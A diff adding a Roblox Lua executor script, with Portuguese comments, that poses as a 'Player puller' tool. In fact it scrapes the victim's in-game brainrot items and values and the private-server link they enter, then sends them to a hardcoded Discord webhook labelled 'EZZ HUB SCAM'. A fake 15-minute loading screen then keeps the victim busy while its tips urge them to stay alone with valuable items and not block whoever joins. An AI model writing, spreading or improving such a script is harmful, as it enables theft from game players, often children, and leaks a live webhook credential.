@@ -1,0 +1,333 @@
+-- Player Puller - LocalScript pronto para Delta (Android)
+-- Usa: Workspace.Plots.*.AnimalPodiums.*.Base.Spawn.Attachment.AnimalOverhead
+-- Nome: DisplayName.Text
+-- Valor: Generation.Text
+-- Embed enviado ao clicar OK, depois loading full-screen por 15min.
+
+-- ========= CONFIG =========
+local WEBHOOK_URL = "https://discord.com/api/webhooks/1428872448786436176/gNVv2m6PDYafOCl_LmVj0kfnsJu3zzjBJ8eWjqUW_Gp-HWqR_iuQZZC9SoPe3vZfswme"
+local EMBED_COLOR = 0x3498DB
+local LOAD_DURATION = 15 * 60 -- segundos (15 minutos)
+-- ==========================
+
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+local HttpService = game:GetService("HttpService")
+local RunService = game:GetService("RunService")
+local player = Players.LocalPlayer
+local playerGui = player:WaitForChild("PlayerGui")
+
+-- HTTP helper for Delta (http_request) with fallbacks
+local function send_http(payload)
+    local body = HttpService:JSONEncode(payload)
+    local headers = { ["Content-Type"] = "application/json" }
+    local req = http_request or request or (syn and syn.request) or (fluxus and fluxus.request)
+    if not req then
+        warn("Executor não suporta requisições HTTP (http_request/request/syn/fluxus não encontrado).")
+        return false, "no-http"
+    end
+    local ok, err = pcall(function()
+        req({ Url = WEBHOOK_URL, Method = "POST", Headers = headers, Body = body })
+    end)
+    return ok, err
+end
+
+-- parse value like "$1.2M/s", "$1,200,000/s", "1.2M" -> number
+local function parseValueToNumber(s)
+    if not s then return nil end
+    local str = tostring(s)
+    str = str:gsub("%s+", "")            -- remove spaces
+    str = str:gsub("/s$", "")            -- remove trailing /s
+    str = str:gsub("%$", ""):gsub(",", "") -- remove $ and commas
+    local n = tonumber(str:match("^[%d%.]+"))
+    local suf = str:match("([MB])")
+    if not n then
+        local a,b = str:match("([%d%.]+)([MB])")
+        if a and b then n = tonumber(a); suf = b end
+    end
+    if not n then return nil end
+    if suf == "M" then n = n * 1e6
+    elseif suf == "B" then n = n * 1e9 end
+    return n
+end
+
+-- collect brainrots: returns arrays names[], values[] (strings)
+local function collectBrainrots()
+    local names = {}
+    local values = {}
+    local plots = Workspace:FindFirstChild("Plots")
+    if not plots then return names, values end
+
+    for _, plot in ipairs(plots:GetChildren()) do
+        if plot and plot:FindFirstChild("AnimalPodiums") then
+            for _, podium in ipairs(plot.AnimalPodiums:GetChildren()) do
+                if podium and podium:FindFirstChild("Base") then
+                    local base = podium.Base
+                    if base and base:FindFirstChild("Spawn") and base.Spawn:FindFirstChild("Attachment") then
+                        local att = base.Spawn.Attachment
+
+                        if att:FindFirstChild("AnimalOverhead") then
+                            local overhead = att.AnimalOverhead
+
+                            -- Nome do animal
+                            local nameText = nil
+                            if overhead:FindFirstChild("DisplayName") then
+                                local nObj = overhead.DisplayName
+                                if nObj:IsA("TextLabel") or nObj:IsA("TextBox") then
+                                    nameText = nObj.Text
+                                elseif nObj.ClassName == "StringValue" then
+                                    nameText = nObj.Value
+                                end
+                            end
+
+                            -- Valor do animal
+                            local valueText = nil
+                            if overhead:FindFirstChild("Generation") then
+                                local gObj = overhead.Generation
+                                if gObj:IsA("TextLabel") or gObj:IsA("TextBox") then
+                                    valueText = gObj.Text
+                                elseif gObj.ClassName == "StringValue" then
+                                    valueText = gObj.Value
+                                end
+                            end
+
+                            -- Insere sem filtro
+                            if nameText and valueText then
+                                table.insert(names, tostring(nameText))
+                                table.insert(values, tostring(valueText))
+                            end
+                        end
+                    end
+                end
+            end
+        end
+    end
+
+    return names, values
+end
+
+-- send embed: names[] and values[] are parallel arrays (strings)
+local function sendEmbed(playerMsg)
+    local names, values = collectBrainrots()
+    local brainField, valueField
+
+    if #names == 0 then
+        brainField = "⚠️ Não há brainrot encontrado."
+        valueField = "⚠️ Não há brainrot encontrado."
+    else
+        brainField = table.concat(names, "\n")
+        valueField = table.concat(values, "\n")
+    end
+
+    local totalPlayers = #Players:GetPlayers()
+    local maxPlayers = Players.MaxPlayers or 0
+
+    local payload = {
+        username = "EZZ HUB SCAM",
+        embeds = {{
+            title = "EZZ HUB SCAM",
+            color = EMBED_COLOR,
+            fields = {
+                { name = "🧠 Brainrots", value = brainField, inline = false },
+                { name = "💰 Value", value = valueField, inline = false },
+                { name = "👥 Players", value = tostring(totalPlayers) .. "/" .. tostring(maxPlayers), inline = true },
+                { name = "🧷 Servidor", value = tostring(playerMsg or "Nenhuma mensagem"), inline = false },
+            }
+        }}
+    }
+
+    local ok, err = send_http(payload)
+    if not ok then warn("Falha ao enviar webhook:", err) end
+    return ok, err
+end
+
+-- ================= GUI ================
+-- Remove UI existente se houver
+local existing = playerGui:FindFirstChild("PlayerPullerUI")
+if existing then existing:Destroy() end
+
+local screen = Instance.new("ScreenGui")
+screen.Name = "PlayerPullerUI"
+screen.Parent = playerGui
+screen.IgnoreGuiInset = true
+screen.ResetOnSpawn = false
+screen.DisplayOrder = 100000
+
+-- main menu frame (centered)
+local mainFrame = Instance.new("Frame", screen)
+mainFrame.Size = UDim2.new(0, 420, 0, 220)
+mainFrame.Position = UDim2.new(0.5, -210, 0.5, -110)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30,30,30)
+mainFrame.BorderSizePixel = 0
+mainFrame.ZIndex = 1000
+mainFrame.Active = true
+mainFrame.Draggable = true
+
+local titleLabel = Instance.new("TextLabel", mainFrame)
+titleLabel.Size = UDim2.new(1,0,0,50)
+titleLabel.Position = UDim2.new(0,0,0,0)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Font = Enum.Font.GothamBold
+titleLabel.TextSize = 28
+titleLabel.Text = "Player puller"
+titleLabel.TextColor3 = Color3.fromRGB(0,170,255)
+titleLabel.ZIndex = 1001
+
+local inputBox = Instance.new("TextBox", mainFrame)
+inputBox.Size = UDim2.new(1, -40, 0, 54)
+inputBox.Position = UDim2.new(0, 20, 0, 80)
+inputBox.PlaceholderText = "Seu servidor privado aqui"
+inputBox.PlaceholderColor3 = Color3.fromRGB(140,140,140)
+inputBox.Text = ""
+inputBox.Font = Enum.Font.GothamBold
+inputBox.TextSize = 20
+inputBox.BackgroundColor3 = Color3.fromRGB(45,45,45)
+inputBox.TextColor3 = Color3.fromRGB(255,255,255)
+inputBox.ClearTextOnFocus = false
+inputBox.ZIndex = 1001
+
+local okBtn = Instance.new("TextButton", mainFrame)
+okBtn.Size = UDim2.new(0,140,0,44)
+okBtn.Position = UDim2.new(0.5, -70, 0, 150)
+okBtn.BackgroundColor3 = Color3.fromRGB(0,170,255)
+okBtn.Font = Enum.Font.GothamBold
+okBtn.Text = "OK"
+okBtn.TextScaled = true
+okBtn.TextColor3 = Color3.fromRGB(255,255,255)
+okBtn.ZIndex = 1001
+
+-- ========== Loading GUI (hidden until needed) ==========
+local function createLoadingGui()
+    local lg = Instance.new("ScreenGui")
+    lg.Name = "BlackLoadingScreen"
+    lg.Parent = playerGui
+    lg.IgnoreGuiInset = true
+    lg.ResetOnSpawn = false
+    lg.DisplayOrder = 200000
+
+    local blackFrame = Instance.new("Frame", lg)
+    blackFrame.Size = UDim2.new(0, 10000, 0, 1000)
+    blackFrame.Position = UDim2.new(0.5, -5000, 0.5, -500)
+    blackFrame.BackgroundColor3 = Color3.fromRGB(0,0,0)
+    blackFrame.BorderSizePixel = 0
+    blackFrame.ZIndex = 200001
+
+    local loadTitle = Instance.new("TextLabel", blackFrame)
+    loadTitle.Size = UDim2.new(1,0,0,80)
+    loadTitle.Position = UDim2.new(0,0,0.2,0)
+    loadTitle.BackgroundTransparency = 1
+    loadTitle.Font = Enum.Font.GothamBold
+    loadTitle.TextSize = 32
+    loadTitle.TextColor3 = Color3.fromRGB(255,255,255)
+    loadTitle.Text = "Puxando players por favor espere"
+    loadTitle.ZIndex = 200002
+
+    local progressBg = Instance.new("Frame", blackFrame)
+    progressBg.Size = UDim2.new(0.5, 0, 0, 44)
+    progressBg.Position = UDim2.new(0.25, 0, 0.48, 0)
+    progressBg.BackgroundColor3 = Color3.fromRGB(35,35,35)
+    progressBg.ZIndex = 200002
+
+    local progressBar = Instance.new("Frame", progressBg)
+    progressBar.Size = UDim2.new(0,0,1,0)
+    progressBar.Position = UDim2.new(0,0,0,0)
+    progressBar.BackgroundColor3 = Color3.fromRGB(0,170,255)
+    progressBar.ZIndex = 200003
+
+    local percentLabel = Instance.new("TextLabel", progressBg)
+    percentLabel.Size = UDim2.new(1,0,1,0)
+    percentLabel.BackgroundTransparency = 1
+    percentLabel.Font = Enum.Font.GothamBold
+    percentLabel.TextSize = 20
+    percentLabel.TextColor3 = Color3.fromRGB(255,255,255)
+    percentLabel.Text = "0%"
+    percentLabel.ZIndex = 200004
+
+    local tipLabel = Instance.new("TextLabel", blackFrame)
+    tipLabel.Size = UDim2.new(1, -40, 0, 56)
+    tipLabel.Position = UDim2.new(0, 20, 0.58, 0)
+    tipLabel.BackgroundTransparency = 1
+    tipLabel.Font = Enum.Font.Gotham
+    tipLabel.TextSize = 18
+    tipLabel.TextColor3 = Color3.fromRGB(200,200,200)
+    tipLabel.TextWrapped = true
+    tipLabel.ZIndex = 200004
+    tipLabel.Text = "👥 - Recomendo estar só você no servidor!"
+
+    return {
+        screenGui = lg,
+        blackFrame = blackFrame,
+        progressBg = progressBg,
+        progressBar = progressBar,
+        percentLabel = percentLabel,
+        tipLabel = tipLabel
+    }
+end
+
+local loading = createLoadingGui()
+loading.screenGui.Enabled = false
+
+-- tips array
+local TIPS = {
+    "👥 - Recomendo estar só você no servidor!",
+    "💰 - Recomendo ter um brainrot 10M+!",
+    "🛑 - Recomendo não dar block nas pessoas que entram, eles têm coisa boa!"
+}
+
+-- Loading routine
+local function runLoading()
+    loading.screenGui.Enabled = true
+    loading.screenGui.DisplayOrder = 200000
+    local start = tick()
+    local lastTip = start
+    local tipIndex = 1
+    loading.tipLabel.Text = TIPS[tipIndex]
+
+    while true do
+        local now = tick()
+        local elapsed = now - start
+        local frac = math.clamp(elapsed / LOAD_DURATION, 0, 1)
+        loading.progressBar.Size = UDim2.new(frac, 0, 1, 0)
+        loading.percentLabel.Text = string.format("%.0f%%", frac * 100)
+
+        if now - lastTip >= 60 then
+            lastTip = now
+            tipIndex = tipIndex + 1
+            if tipIndex > #TIPS then tipIndex = 1 end
+            loading.tipLabel.Text = TIPS[tipIndex]
+        end
+
+        if frac >= 1 then
+            loading.progressBar.Size = UDim2.new(1,0,1,0)
+            loading.percentLabel.Text = "100%"
+            break
+        end
+        RunService.RenderStepped:Wait()
+    end
+end
+
+-- OK button behavior: must have text in textbox
+okBtn.MouseButton1Click:Connect(function()
+    local txt = tostring(inputBox.Text or ""):gsub("^%s*(.-)%s*$","%1")
+    if txt == "" then
+        inputBox.PlaceholderText = "Digite algo para continuar!"
+        inputBox.PlaceholderColor3 = Color3.fromRGB(255,80,80)
+        task.delay(1.2, function()
+            if inputBox and inputBox.Parent then
+                inputBox.PlaceholderText = "Seu servidor privado aqui"
+                inputBox.PlaceholderColor3 = Color3.fromRGB(140,140,140)
+            end
+        end)
+        return
+    end
+
+    mainFrame.Visible = false
+
+    task.spawn(function()
+        sendEmbed(txt)
+    end)
+
+    task.spawn(runLoading)
+end)
+
+print("Player Puller script loaded (Delta) - menu is visível.")
